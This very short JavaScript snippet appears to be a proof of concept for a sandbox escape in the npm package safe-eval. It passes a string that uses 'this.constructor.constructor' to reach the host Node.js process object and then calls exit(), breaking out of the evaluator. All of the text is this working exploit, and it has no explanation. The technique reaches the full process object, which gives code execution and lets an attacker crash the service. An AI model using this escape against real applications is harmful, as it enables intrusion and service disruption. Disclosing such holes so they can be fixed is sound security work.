var safeEval = require('safe-eval');
safeEval("this.constructor.constructor('return process')().exit()");

